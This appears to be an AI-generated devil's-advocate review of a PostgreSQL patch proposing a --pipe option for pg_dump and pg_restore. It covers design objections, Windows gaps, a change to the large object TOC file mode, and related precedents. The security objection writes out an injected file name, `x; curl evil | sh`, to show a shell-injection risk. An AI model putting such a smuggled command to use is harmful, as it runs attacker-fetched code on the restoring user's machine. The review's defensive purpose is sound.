cf.title: Adding pg_dump flag for parallel export to pipes

input.subject: Adding pg_dump flag for parallel export to pipes

verdict_reasoning: The goal is clear and several independent participants asked for it, so levels 1a and 1b pass. Four fixable design objections survived at level 2. The decisive one is security-1: pg_restore --pipe puts file names read from the archive into a shell command without validation. standards-compat-2, maintenance-fit-1 and maintenance-fit-4 are smaller. None of them requires a different proposal.

brief.title: pg_dump and pg_restore --pipe option for directory format
brief.problem: In directory format (-Fd), pg_dump writes each table to its own file, so users cannot pipe the output to compression, throttling, ssh or cloud storage as they can with text format. This matters for parallel dumps (-j), which require the directory format and so need the full dump on local disk first. A reviewer added the case of streaming a parallel pg_dump straight into a parallel pg_restore.
brief.proposed_design: A new --pipe option, first named --pipe-command, replaces --file or the filename for directory format and runs a shell command through popen for each archive file instead of fopen. A %f placeholder in the command is replaced with the file name that directory mode would use (toc.dat, <dump_id>.dat, blob files). pg_restore gets the same option to read each file from a command.
user_visible_surface: pg_dump option --pipe=command, directory format only, cannot be used with --file or with --compress
pg_restore option --pipe=command, cannot be used with the filename argument, works with -l and -L
%f placeholder in the command, replaced with each archive file name
Warning when --pipe is used with parallel jobs and the command has no %f
Large object TOC file now opened in 'w' mode instead of 'ab', also without --pipe
author_claims: Users can stream directory-format dumps to cloud storage, to a remote host over ssh with throttling, or through custom compression.
A pipe command gives more choice of compression algorithm than the built-in --compress.
Append mode for the large object TOC file is not needed, because _StartLOs runs once per archive entry.
With these core changes, the rest of pg_dump works without change.
brief.thread_state: Thomas Munro, Mahendra Singh Thalor and solai v found the idea useful, and solai v said the v17 series looks good after an end-to-end test. Dilip Kumar is a listed reviewer but has posted no review; v21 skips the tests on Windows and needs a rebase.
unclear: The proposal does not say how --pipe works on Windows, where the tests are skipped because command parsing fails.
The proposal does not say why --pipe cannot be combined with --compress, or whether that limit is meant to stay.
The proposal does not say what happens to files already written when one pipe command fails part way through.
The proposal does not say whether pg_dumpall directory mode will support --pipe; the author left it for a later patch.
The proposal does not say whether the change from 'ab' to 'w' for the large object TOC file is safe when blobs span several archive entries.

objections.title: pg_restore --pipe passes archive-supplied file names to the shell
objections.failure_scenario: A user runs pg_restore --pipe="cat dumpdir/%f" on a directory dump from a vendor, a bug report or a shared bucket. Someone has edited toc.dat or blob_NNN.toc so that one stored file name is `x; curl evil | sh`. pg_restore puts that text into the command and runs it with popen, and the user finds out only after the shell has run it.
objections.argument: In directory format, pg_restore reads each data file name back from toc.dat, and each large object file name from the blob TOC file. So with --pipe, the %f values come from the archive, not from pg_restore. Message #19 added shell escaping, and message #20 removed it because the command runs on the client. Today a tampered archive can at most make pg_restore open an unexpected path, but with --pipe it can run a shell command as the restoring user, and recent work on pg_dump and psql treats an untrusted dump or server as a real threat.
objections.author_must_show: How does pg_restore --pipe make sure a file name read from toc.dat or a blob TOC file cannot inject shell syntax, for example by checking it against the expected name pattern before substitution?

critic.reasoning: In directory format, pg_restore reads data file names from toc.dat and large object file names from the blob TOC file. Message #20 removed the escaping, and the visible material shows no validation of these names before they reach the shell.

objections.title: Shell contract for --pipe is undefined on Windows
objections.failure_scenario: A Windows user copies a documented example such as --pipe="cat > dumpdir/%f". popen hands the command to cmd.exe, which has different quoting and tools, so the command fails or writes to the wrong place. The user finds out when the dump errors or the files are missing.
objections.argument: Message #31 skips all pipe tests on Windows because command parsing keeps failing, and message #20 removed shell escaping for the same reason. The documentation gives only POSIX shell examples and does not say which shell runs the command or how %f is quoted. A user-facing option whose meaning differs by platform, with no tests on one of them, leaves that platform without a defined contract.
objections.author_must_show: Which shell runs the --pipe command on Windows, how is a %f file name quoted there, and what test shows that it works?

critic.reasoning: Message #31 says command parsing keeps failing on Windows, and the docs give only POSIX shell examples. COPY PROGRAM and archive_command also depend on the platform shell, but they are shown to work there, and this option is not.

objections.title: Overloading the file name field with a pipe command invites silent misuse
objections.failure_scenario: A later patch adds a code path in pg_restore or pg_dumpall that uses the archive file spec as a path and does not check the pipe flag. The user's shell command is then opened as a file name. The user sees a confusing "could not open" error, or the wrong file is read.
objections.argument: The patch stores the command in the existing file name variables and adds a bool next to them (message #1). Message #16 shows this has already happened twice. restore_global_objects needed the new flag added, and pg_restore --format=tar opened "cat" as a TOC file. pg_dumpall directory mode is left out (message #19), so the next patch that adds it has to find every such place by hand.
objections.author_must_show: Can the pipe command get its own field or type, so that code which treats it as a path fails to compile or fails a check?

critic.reasoning: Message #16 shows two places where the command was treated as a path: restore_global_objects, and --format=tar opening "cat" as a TOC file. The thread offers no mechanism that makes a missed check fail loudly.

objections.title: Large object TOC mode change for all users bundled into feature
objections.failure_scenario: A user who never uses --pipe dumps a database whose large objects span several archive entries. If any path opens the same blob TOC file twice, the change from 'ab' to 'w' truncates it. The user finds out when the restore of large objects fails.
objections.argument: Message #1 left 'w' mode limited to pipe mode because the 'ab' code "has been there since the start". Message #19 then made it unconditional, with "If there is a concern, we can revert". The change affects every directory-format dump, and the only support offered is a reading of the call order of _StartLOs. As one hunk inside a 38 KB feature commit, it cannot be reviewed or reverted on its own.
objections.author_must_show: Can the 'ab' to 'w' change go in as a separate first commit, with a test showing that no path opens a blob TOC file twice?

critic.reasoning: The truncation scenario is hypothetical, since each blob TOC file belongs to one archive entry. The request still stands: message #19 changed behaviour for all directory dumps inside the feature commit, and a separate commit with its reasoning is a fair request.

refuted.title: Archives written with --pipe are not readable as directory archives
refuted.failure_scenario: An operator dumps with --pipe="gzip > dumpdir/%f.gz" and keeps the result. A year later another admin runs pg_restore -Fd dumpdir, and it fails because there is no toc.dat. The archive holds no record of the transform that is needed to read it back.
refuted.argument: The patch forbids --compress with --pipe, so toc.dat records no compression even when the user compressed every file. Today a directory archive describes itself and pg_restore reads it without help. With --pipe, the restore depends on an inverse command that the user must keep track of outside the archive, and the documentation does not warn about this. A committer would likely ask whether the archive should record that it was written through a pipe, or whether the docs should at least say so.
refuted.author_must_show: How does a user who finds a --pipe archive without notes learn which command is needed to restore it?

critic.reasoning: pg_restore finds directory-archive files, including toc.dat, by trying the .gz, .lz4 and .zst suffixes, so the gzip example should restore without the inverse command. For other transforms the user keeps the inverse, as with a text dump piped through a shell command today.

refuted.title: Large object TOC file mode change applies to every directory dump
refuted.failure_scenario: A user without --pipe runs pg_dump -Fd on a database with large objects. If any code path opens the same blob_NNN.toc a second time, 'w' truncates the entries written earlier. pg_restore then silently skips those large objects, and the user finds out only when the data is needed.
refuted.argument: Since message #19, the 'ab' to 'w' change covers the normal --file path too, so archives written by all directory-format users change. The only reason for it is the author's reading that _StartLOs runs once per archive entry (message #1), and the author also notes that the append mode "has been there since the start". No test or analysis shown in the thread covers large objects split over many BLOBS entries or parallel workers. A committer would likely ask to keep 'ab' outside --pipe, or to split the change into its own commit with its reasoning.
refuted.author_must_show: Which invariant ensures that each blob TOC file is opened once per dump, and which tests cover split large object entries with -j?

critic.reasoning: Duplicate of maintenance-fit-4. It names no code path that opens the same blob TOC file twice; each file is named after its archive entry and _StartLOs runs once per entry.

refuted.title: Feature ships untested on Windows with known parsing failures
refuted.failure_scenario: A Windows user runs pg_dump -j 4 --pipe with a quoted command and %f. If the command parsing fails there as it does in the tests, the dump fails or writes to the wrong target. No buildfarm test catches it, so the report arrives after release.
refuted.argument: Messages #19 to #31 show seven versions spent on Windows quoting. v21 then skips the tests on Windows because "the pipe command parsing for Windows keeps failing" (message #31). The documentation does not limit the option to non-Windows platforms. A committer would own a platform behaviour that nobody has shown to work, and no committer who knows this area on Windows has engaged.
refuted.author_must_show: Does --pipe work on Windows, and if not, will the patch reject the option there instead of skipping the tests?

critic.reasoning: Duplicate of standards-compat-2, which covers the same Windows gap as a user interface contract. The missing tests are level 4 and the missing owner belongs in the committability field.

refuted.title: Pipe mode runs through every compression backend
refuted.failure_scenario: A developer later adds a new compression method or changes the open path of an existing one. The pipe case is not handled in the new code. Only a user who combines --pipe with that path finds out.
refuted.argument: The code patch touches compress_none, compress_gzip, compress_lz4 and compress_zstd, both .c and .h, but --pipe is refused with any compression (message #16, commit message). So the compression API grows a popen variant that only the "none" path uses today, and every backend has to carry it. The proposal does not say why the pipe belongs in that layer instead of in the directory format's file open code.
refuted.author_must_show: Why does pipe support need changes in every compression backend when only compression none is allowed with --pipe?

critic.reasoning: The patch refuses --pipe with any compression, so a user cannot reach a compression backend that lacks pipe handling. The touched-files list alone does not show that each backend carries a popen variant; a changed open signature would touch the same files.

refuted.title: Network filesystems and built-in compression already cover most listed use cases
refuted.failure_scenario: An operator who wants a parallel -Fd dump on a remote host or in cloud storage can already point --file at an sshfs or object-storage FUSE mount, with --compress=zstd. If core adds --pipe for these cases, it keeps a per-file popen path in pg_dump and pg_restore. That path cannot be tested on Windows today (message #31).
refuted.argument: Message #1 lists three use cases: cloud storage, ssh, and custom compression. The --compress option already offers gzip, lz4 and zstd, and a mounted filesystem gives ssh and cloud targets without any change to pg_dump. What --pipe adds beyond these is rate limiting, other compression programs, and setups where a FUSE mount is not allowed. The proposal argues for flexibility but does not show users who are blocked by the existing ways.
refuted.author_must_show: Which users cannot use a mounted filesystem with --compress for parallel directory dumps, and what stops them?

critic.reasoning: A mounted filesystem cannot stream a parallel dump into a parallel restore without a full copy on disk, which message #9 describes as a known limitation. Four independent participants called the feature useful, and FUSE mounts need extra software and privileges outside core.

touch_points.label: pg_dump / restore round-trip
touch_points.reason: Directory archives are written and read through user commands, and the large object TOC file open mode changes for every directory dump.

touch_points.label: security / privileges
touch_points.reason: pg_restore --pipe substitutes file names read from toc.dat and blob TOC files into a command run with popen.

touch_points.label: backpatchability
touch_points.reason: The CommitFest entry sets target version to stable, but a new option can go to master only.

touch_points.label: maintenance burden ("who maintains this in 10 years")
touch_points.reason: A per-file popen path in pg_dump and pg_restore, a command stored in the file name field, and no Windows tests.

touch_points.label: doesn't fit what Postgres is about (extension / external tool / already solved)

questions: How does pg_restore --pipe stop a file name read from toc.dat or a blob TOC file from injecting shell syntax into the command?
Does --pipe work on Windows, and if it does not, will pg_dump and pg_restore reject the option there instead of skipping the tests?
Can the pipe command have its own field or type, so that code which treats it as a path fails a check instead of opening the command as a file?
Can the 'ab' to 'w' change for the large object TOC file be a separate first commit with a test for large objects split over several entries with -j?
When one pipe command fails part way through a parallel dump, what does pg_dump report, and what happens to the output already written by the other commands?

committability.owner_note: Someone who knows the pg_dump archive formats and the parallel dump code, and who can judge command execution on Windows.
committability.liability: The owner signs for a shell-command interface in pg_dump and pg_restore on all platforms, for as long as the option exists. The owner also signs for the large object TOC file mode change, which affects every directory-format dump.
committability.author_follow_up: Strong sign: the authors posted 21 versions since April 2025 and moved the entry forward through six CommitFests.

priority.reason: Users of parallel dumps on large databases gain streaming without staging the full dump on local disk, and reviewers found the idea useful. The v21 core patch is about 38 KB across 17 files in src/bin/pg_dump. The file name validation and the Windows behaviour need answers before a committer can take it.

provisional_note: Without the code, this review could not confirm whether pg_restore checks archive file names before substitution, or whether any path opens a blob TOC file twice. Only 3 of 31 messages were read in full, so later messages may already answer some of these points.
disclosure: Prepared by an AI harness; treat as a devil's advocate, not a verdict.

precedents_retrieved.title: pg_dump: optimize dumpFunc()
precedents_retrieved.summary: Replace pg_dump's per-function query in dumpFunc() with a single query that gathers data for all functions up front, keeping the PGresult in memory and using a sorted array of function OIDs to locate each function's row. The aim was to reduce dump time for databases with many functions (shown as about 0.25s to about 0.11s for 10k simple functions).
precedents_retrieved.objection: Tom Lane questioned whether the change helps databases with few functions and what it does to pg_dump's memory requirements when there are very many functions with large source text, and said the shown results did not justify the risk. The author agreed and withdrew the patch.
precedents_retrieved.key_quote:
I'm not sure that the results you're showing justify taking any
risk here.

precedents_retrieved.title: Improve pg_dump dumping publication tables
precedents_retrieved.summary: The patch changes pg_dump's getPublicationTables() to fetch all publication-table memberships with a single query, instead of iterating over every table and issuing a separate query per table. The matching TableInfo for each row is then looked up in tblinfoindex, which should be faster when there are many tables.
precedents_retrieved.objection: The patch was superseded, not rejected: Tom Lane had already committed practically the same change in passing (commit 8e396a773), which also removed the server-side join. He therefore marked the entry withdrawn. Cary Huang's earlier concern about client-side memory use with very many publication tables was answered by Tom Lane as not significant compared to the per-table data pg_dump already collects.
precedents_retrieved.key_quote:
I'll mark this CF entry "withdrawn", since it wasn't rejected
exactly.  Too bad we don't have a classification of "superseded
by events", or something like that.

precedents_retrieved.title: pg_dump --where option
precedents_retrieved.summary: Add a --where option to pg_dump that exposes pg_dump's existing internal ability to filter dumped table data with a WHERE clause, building on an earlier patch. This version aims to give clearer error messages for invalid clauses and to apply a filter only to a specified table instead of to every table matched by a pattern.
precedents_retrieved.objection: Daniel Gustafsson's review raised open issues: pasting arbitrary SQL into the query without schema-qualification checks may expose CVE-2018-1058-style problems, the patch had no tests, and it was unclear how quoted multibyte table names or table names containing colons would be handled. The author did not answer this review for two weeks, and Michael Paquier, noting that tests are needed, marked the entry returned with feedback.
precedents_retrieved.key_quote:
Documenting something is well and good, but isn't allowing arbitrary SQL
copy-pasted into the query (which isn't checked for schema qualification)
opening up for some of the ill-effects of CVE-2018-1058?

precedents_retrieved.title: pg_dump -C Grant statement on create database
precedents_retrieved.summary: When pg_dump is run with -C (emit CREATE DATABASE), it would also emit the database-level GRANT statements (such as GRANT CREATE ON DATABASE), matching what pg_dumpall already produces. The patch makes emitting these grants subject to the existing -x (no privileges) option.
precedents_retrieved.objection: The visible messages do not show why. The thread contains only the original report, a reply agreeing it is an oversight, and the patch submission; no review or objection to the patch appears, and the entry was returned with feedback about three months later.

precedents_retrieved.title: pg_dump new feature: exporting functions only
precedents_retrieved.summary: Add a pg_dump switch (--functions-only) to dump only stored functions and procedures from a database, without resolving their dependencies on other objects. During the discussion the design moved toward pattern-based include/exclude options per object type (e.g. --routine/--exclude-routine alongside --table, --schema, --extension).
precedents_retrieved.objection: Reviewers asked for a different design: pattern-matching options per object type with matching exclude options, in line with --table and --extension, instead of an all-or-nothing --functions-only switch. The author summarised the new plan and said she would rewrite the patch, but no reworked patch is shown before the deadline. The committer closing the entry concluded that a different design was wanted and that it would not make v15.
precedents_retrieved.key_quote:
Looks clear to me that a different design is wanted here, and that
this won't make it for v15, so I have marked the patch as returned
with feedback in the CF app.

precedents_retrieved.title: Ignore attributes of tables part of extensions in pg_dump
precedents_retrieved.summary: Change pg_dump so that getTableAttrs skips fetching column and type information for tables that are members of an extension, using the ext_member flag. The goal was to avoid gathering attributes for tables that pg_dump does not dump individually.
precedents_retrieved.objection: The author withdrew the patch. A reviewer asked why it checked ext_member rather than the usual dobj.dump flag. The author concluded that skipping attributes based on either flag would break binary upgrade, which still dumps extension member tables individually.
precedents_retrieved.key_quote: Hm. I have been pondering about this code more and I am dropping the patch as either adding a check based on the flag to track dumpable objects or ext_member visibly breaks the logic that binary upgrade and tables in extensions rely on.

precedents_retrieved.title: Improving test coverage of extensions with pg_dump
precedents_retrieved.summary: Improving test coverage of extensions with pg_dump

precedents_retrieved.title: Add --include-table-data-where option to pg_dump, to export only a subset of table data
precedents_retrieved.summary: Add a pg_dump option (initially --include-table-data-where=table:filter_clause, later discussed as --where) that applies a user-supplied WHERE clause to the data dump of tables matching a pattern, so that only a subset of rows is exported. The option could be given multiple times, and each filter applied to every table matching its pattern.
precedents_retrieved.objection: It was returned with feedback because the patch had merge conflicts and was not rebased after a reviewer asked for it; the author posted a rebased patch only after the entry had been closed. Reviewers had also raised open design points about the option syntax: the use of a colon to separate table from clause, how colons in table or column names would be parsed, and how the option interacts with --table. One participant also questioned whether the feature was needed, given psql \copy.
precedents_retrieved.key_quote: Given this patch has not been updated, I'm marking this as returned with feedback.

precedents_retrieved.title: Improve pg_restore toc file parsing and format for better performances
precedents_retrieved.summary: The patch set shrinks toc.dat and speeds up pg_restore -l by dropping the unused has-oids field, replacing sscanf with strtoul, and storing integers in binary form. A fourth patch stores owners, tablespaces, table access methods and schemas once in string tables and replaces the per-entry strings with indexes.
precedents_retrieved.objection: The author stopped responding after review. Nathan Bossart and vignesh C left comments on 0002 to 0004: OIDs need InvalidOid as the list terminator, debug printf calls and palloc in a client tool must go, and the repeated code needs a common function. No new version followed, and Nathan Bossart's request for a revision got no reply, so vignesh C returned the entry because the comments were not resolved.
precedents_retrieved.key_quote:
I have changed the status of commitfest entry to "Returned with
Feedback" as the comments have not yet been resolved.

precedents_retrieved.title: Restore lock level to update statusFlags
precedents_retrieved.summary:
Restore lock level to update statusFlags
Reverted commit(s): Relax lock level for setting PGPROC->statusFlags
precedents_retrieved.objection:
Reverts 27838981be9d (some comments are kept).  Per discussion, it does
not seem safe to relax the lock level used for this; in order for it to
be safe, there would have to be memory barriers between the point we set
the flag and the point we set the trasaction Xid, which perhaps would
not be so bad; but there would also have to be barriers at the readers'
side, which from a performance perspective might be bad.

Now maybe this analysis is wrong and it *is* safe for some reason, but
proof of that is not trivial.

precedents_retrieved.title: Revert refactoring of restore command code to shell_restore.c
precedents_retrieved.summary: Revert refactoring of restore command code to shell_restore.c
precedents_retrieved.objection:
This reverts commits 24c35ec and 57169ad.  PreRestoreCommand() and
PostRestoreCommand() need to be put closer to the system() call calling
a restore_command, as they enable in_restore_command for the startup
process which would in turn trigger an immediate proc_exit() in the
SIGTERM handler.  Perhaps we could get rid of this behavior entirely,
but 24c35ec has made the window where the flag is enabled much larger
than it was, and any Postgres-like actions (palloc, etc.) taken by code
paths while the flag is enabled could lead to more severe issues in the
shutdown processing.

Note that curculio has showed that there are much more problems in this
area, unrelated to this change, actually, hence the issues related to
that had better be addressed first.  Keeping the code of HEAD in line
with the stable branches should make that a bit easier.

Per discussion with Andres Freund and Nathan Bossart.

roaster_notes.note: No precedent found: the retrieved list has no earlier proposal of the same or a similar idea, and no thread message points to an earlier discussion of it. So the prior-attempts angle has no rejection reason to carry forward.
Two fixable objections. The rename to --pipe and the %f placeholder follow existing practice and were settled in message #17.
The proposal touches no server state, WAL, catalog or wire protocol. The archive layout stays the same apart from the large object TOC open mode.
One objection, on pg_restore only. The pg_dump side builds %f from dump IDs and large object OIDs, and the command comes from the invoking user, so the feature grants no new privilege there.
Demand and fit are not in question from this angle. The objections are about how the design will be maintained.

One objection only. COPY ... TO PROGRAM is an existing core precedent for this option, and message #9 shows a use case that a mount does not cover: streaming a parallel dump into pg_restore. Both lower the weight of the objection.

The material shows real demand from several independent people. In message #9 Andrew Jackson calls disk staging between parallel pg_dump and pg_restore a well-known limitation for large databases, and Thomas Munro (#4), Mahendra Singh Thalor (#16) and solai v (#25, #27) found it useful. The cost falls mostly on users of the new option, and no listed workaround gives per-file streaming with -j.
